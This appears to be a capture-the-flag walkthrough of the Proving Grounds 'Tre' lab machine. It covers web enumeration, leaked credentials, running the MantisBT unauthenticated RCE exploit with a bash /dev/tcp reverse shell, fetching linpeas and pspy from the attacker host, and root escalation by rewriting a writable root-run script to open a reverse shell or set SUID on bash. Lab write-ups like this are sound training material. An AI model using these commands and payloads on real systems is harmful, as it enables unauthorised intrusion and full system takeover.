# Tre

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.249.84
```

Open ports discovered:

- **22** — SSH (OpenSSH 7.9p1 Debian 10+deb10u2, protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.38 (Debian))
  - Additional webpages:
    - `http://192.168.249.84/info.php`
    - `http://192.168.249.84/cms/site/`
    - `http://192.168.249.84/system` — discovered by `nikto`; default credentials found for 'Restricted Content' (ID `admin`, PW `admin`). See: CWE-16
    - `http://192.168.249.84/adminer.php`
    - `http://192.168.249.84/mantisbt/`
- **8082** — HTTP (nginx 1.14.2)

Browse to `http://192.168.249.84/info.php`. The `$_SERVER` PHP variables reveal authentication credentials:

```
## PHP Variables
|   |   |
|---|---|
|$_SERVER['PHP_AUTH_USER']|admin|
|$_SERVER['PHP_AUTH_PW']|admin|
```

Browse to `http://192.168.249.84/cms/site/`. A potential user "Alan Smith" is found on `http://192.168.249.84/cms/site/blog.html`. No login page is present.

Browse to `http://192.168.249.84/system`. Login with `admin:admin` redirects to `http://192.168.249.84/system/login_page.php`, which appears to be the same page as `http://192.168.249.84/mantisbt/login_page.php`.

Browse to `http://192.168.249.84/adminer.php`. Adminer version 4.7.7 is running. No exploits were found via `searchsploit`.

Browse to `http://192.168.249.84/mantisbt/`. This redirects to `http://192.168.249.84/mantisbt/login_page.php`.

Check the vulnerability of MantisBT using `searchsploit`:

```
searchsploit mantis                 
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
 Mantis Bug Tracker 0.15.x/0.16/0.17.x - JPGraph Remote File Inclusion Command Exec | php/webapps/21727.txt
 Mantis Bug Tracker 0.19 - Remote Server-Side Script Execution                      | php/webapps/24390.txt
 Mantis Bug Tracker 0.19.2/1.0 - 'Bug_sponsorship_list_view_inc.php' File Inclusion | php/webapps/26423.txt
 Mantis Bug Tracker 0.x - Multiple Cross-Site Scripting Vulnerabilities             | php/webapps/24391.txt
 Mantis Bug Tracker 0.x - New Account Signup Mass Emailing                          | php/webapps/24392.php
 Mantis Bug Tracker 0.x/1.0 - 'manage_user_page.php?sort' Cross-Site Scripting      | php/webapps/27229.txt
 Mantis Bug Tracker 0.x/1.0 - 'view_all_set.php' Multiple Cross-Site Scripting Vuln | php/webapps/27228.txt
 Mantis Bug Tracker 0.x/1.0 - 'View_filters_page.php' Cross-Site Scripting          | php/webapps/26798.txt
 Mantis Bug Tracker 0.x/1.0 - Multiple Input Validation Vulnerabilities             | php/webapps/26172.txt
 Mantis Bug Tracker 1.1.1 - Code Execution / Cross-Site Scripting / Cross-Site Requ | php/webapps/5657.txt
 Mantis Bug Tracker 1.1.3 - 'manage_proj_page' PHP Code Execution (Metasploit)      | php/remote/44611.rb
 Mantis Bug Tracker 1.1.3 - Remote Code Execution                                   | php/webapps/6768.txt
 Mantis Bug Tracker 1.1.8 - Cross-Site Scripting / SQL Injection                    | php/webapps/36068.txt
 Mantis Bug Tracker 1.2.0a3 < 1.2.17 XmlImportExport Plugin - PHP Code Injection (M | multiple/webapps/41685.rb
 Mantis Bug Tracker 1.2.0a3 < 1.2.17 XmlImportExport Plugin - PHP Code Injection (M | php/remote/35283.rb
 Mantis Bug Tracker 1.2.19 - Host Header                                            | php/webapps/38068.txt
 Mantis Bug Tracker 1.2.3 - 'db_type' Cross-Site Scripting / Full Path Disclosure   | php/webapps/15735.txt
 Mantis Bug Tracker 1.2.3 - 'db_type' Local File Inclusion                          | php/webapps/15736.txt
 Mantis Bug Tracker 1.3.0/2.3.0 - Password Reset                                    | php/webapps/41890.txt
 Mantis Bug Tracker 1.3.10/2.3.0 - Cross-Site Request Forgery                       | php/webapps/42043.txt
 Mantis Bug Tracker 2.24.3 - 'access' SQL Injection                                 | php/webapps/49340.py
 Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)                 | php/webapps/48818.py
----------------------------------------------------------------------------------- ---------------------------------
```

Download the unauthenticated remote code execution exploit (48818), modify the configuration variables, and run it:

```
searchsploit -m 48818

nano 48818.py
def __init__(self):
                self.s = requests.Session()
                self.headers = dict() # Initialize the headers dictionary
                self.RHOST = "192.168.249.84" # Victim IP
                self.RPORT = "80" # Victim port
                self.LHOST = "192.168.45.189" # Attacker IP
                self.LPORT = "4444" # Attacker Port
                self.verify_user_id = "1" # User id for the target account
                self.realname = "administrator" # Username to hijack
                self.passwd = "password" # New password after account hijack
                self.mantisLoc = "/mantisbt" # Location of mantis in URL
                self.ReverseShell = "echo " + b64encode("bash -i >& /dev/tcp/" + self.LHOST + "/" + self.LPORT + " 0>&1") + " | base64 -d | /bin/bash" # Reverse shell payload

python2 48818.py
```

The exploit performs a password reset of the `administrator` account (CVE-2017-7615) and takes advantage of a command injection vulnerability (CVE-2019-15715) to spawn a reverse shell.

Catch the reverse shell with `penelope`:

```
www-data@lab-pg-20-debian10-tre1-245-199:/var/www/html/mantisbt$ whoami
www-data
```

Retrieve the `local.txt` flag:

```
www-data@lab-pg-20-debian10-tre1-245-199:/var/www/html/mantisbt$ find / -name local.txt 2>/dev/null
/home/tre/local.txt
www-data@lab-pg-20-debian10-tre1-245-199:/var/www/html/mantisbt$ cat /home/tre/local.txt
c9f58a668d43f9aeda4b408e0fc56950
```

### Alternative Initial Access — Adminer database enumeration

The same enumeration reveals `adminer.php` and `mantisbt/` on port 80. Instead of exploiting the MantisBT RCE, the database credentials can be obtained from `http://192.168.249.84/mantisbt/config/a.txt`, which contains database configuration details. These credentials are used to log into Adminer at `http://192.168.249.84/adminer.php`. Querying the `mantis_user_table` reveals the `tre` user account with the real name `Tr3@123456A!`, which serves as the SSH password. Login via SSH as `tre` to obtain `local.txt`.

Credit: [Pranqster — Proving Grounds Play: Tre](https://pranqsterslair.com/tre)

## Privilege escalation

Upload `linpeas.sh` to the target. On the attacking machine, start a Python HTTP server:

```
python3 -m http.server 9001
```

On the target, download the script:

```
www-data@lab-pg-20-debian10-tre1-245-199:/var/www/html/mantisbt$ cd /tmp
www-data@lab-pg-20-debian10-tre1-245-199:/tmp$ which wget
/usr/bin/wget

www-data@lab-pg-20-debian10-tre1-245-199:/tmp$ wget http://192.168.45.189:9001/linux/enum/linpeas.sh
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@lab-pg-20-debian10-tre1-245-199:/tmp$ chmod +x linpeas.sh 
www-data@lab-pg-20-debian10-tre1-245-199:/tmp$ ./linpeas.sh 
```

Important findings:

```
═╣ Observed UID 0 process paths modifiable by current user (T1574)
PID 497: /bin/bash /usr/bin/check-system | script: /usr/bin/check-system (file writable)
...
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 44 May 12  2020 /etc/apache2/.htpasswd
admin:$apr1$klmM2diE$hD.osekk3Zh3yho7NZlV50
...
╔══════════╣ Searching passwords in PHP files (T1552.001)
/var/www/html/mantisbt/config/config_inc.php:$g_db_password            = 'password@123AS';
```

No further interesting findings as `www-data`. Search for a way to gain access to the machine as `tre` instead.

Log in to the `administrator` account at `http://192.168.249.84/mantisbt/login_page.php` using the reset credentials `administrator:password`.

Explore `http://192.168.249.84/mantisbt/manage_user_page.php`. The `tre` account is found with the real name `Tr3@123456A!`, which appears to be a password.

Log in through SSH as `tre`:

```
ssh tre@192.168.249.84
tre@192.168.249.84's password: Tr3@123456A!

tre@lab-pg-20-debian10-tre1-245-199:~$ whoami
tre
```

Upload and run `linpeas.sh` again as `tre`:

```
# Host
python3 -m http.server 9001

ip a
inet 192.168.45.189/24

# Target
tre@lab-pg-20-debian10-tre1-245-199:~$ cd /tmp
tre@lab-pg-20-debian10-tre1-245-199:/tmp$ which wget
/usr/bin/wget

tre@lab-pg-20-debian10-tre1-245-199:/tmp$ wget http://192.168.45.189:9001/linux/enum/linpeas.sh
```

```
tre@lab-pg-20-debian10-tre1-245-199:/tmp$ chmod +x linpeas.sh 
tre@lab-pg-20-debian10-tre1-245-199:/tmp$ ./linpeas.sh
```

Important findings:

```
══╣ Observed UID 0 process paths modifiable by current user (T1574)
PID 497: /bin/bash /usr/bin/check-system | script: /usr/bin/check-system (file writable)
...
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root root 44 May 12  2020 /etc/apache2/.htpasswd
admin:$apr1$klmM2diE$hD.osekk3Zh3yho7NZlV50
...
╔══════════╣ Searching passwords in PHP files (T1552.001)
/var/www/html/mantisbt/config/config_inc.php:$g_db_password            = 'password@123AS';
...
╔══════════╣ Checking 'sudo -l', sudoers files, and privileged Python paths (T1548.003)
...
User tre may run the following commands on lab-pg-20-debian10-tre1-245-199:
    (ALL) NOPASSWD: /sbin/shutdown
```

Use `pspy64` to monitor for hidden processes:

```
tre@lab-pg-20-debian10-tre1-245-199:/tmp$ wget http://192.168.45.189:9001/linux/enum/pspy64

tre@lab-pg-20-debian10-tre1-245-199:/tmp$ chmod +x pspy64 
tre@lab-pg-20-debian10-tre1-245-199:/tmp$ ./pspy64
...
2026/11/06 23:36:52 CMD: UID=0     PID=1759   | /bin/bash /usr/bin/check-system
```

The script `/usr/bin/check-system` appears to be a cron job executed by `root` every second. The file is modifiable by `tre`.

Read `/usr/bin/check-system`:

```
DATE=`date '+%Y-%m-%d %H:%M:%S'`
echo "Service started at ${DATE}" | systemd-cat -p info

while :
do
echo "Checking...";
sleep 1;
done
```

This is a service that loops every second. It is likely run on machine startup.

Modify `/usr/bin/check-system` to include a reverse shell bash script:

```
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/192.168.45.189/4444 <&1'
```

Reboot the target machine and catch the `root` reverse shell with `penelope`:

```
# Target
sudo shutdown -r now

# Host
root@lab-pg-20-debian10-tre1-245-199:/# whoami
root
```

Retrieve the `proof.txt` flag:

```
root@lab-pg-20-debian10-tre1-245-199:/root# cat proof.txt 
ad306a63fae01b82eb79bcedb00020e2
```

### Alternative Privilege Escalation — SUID binary via check-system

The same `/usr/bin/check-system` file is writable by `tre` and executed by `root` every second. Instead of a reverse shell, the file can be modified to add the SUID bit to `/bin/bash`:

```
echo "chmod +s /bin/bash" > /usr/bin/check-system
```

Reboot the machine using `sudo shutdown -r now`. After reboot, run `/bin/bash -p` to obtain a root shell. Alternatively, the SUID bit can be added to `/usr/bin/find`, which can then be exploited via GTFOBins:

```
find . -exec /bin/sh -p \; -quit
```

Credit: [Pranqster — Proving Grounds Play: Tre](https://pranqsterslair.com/tre)
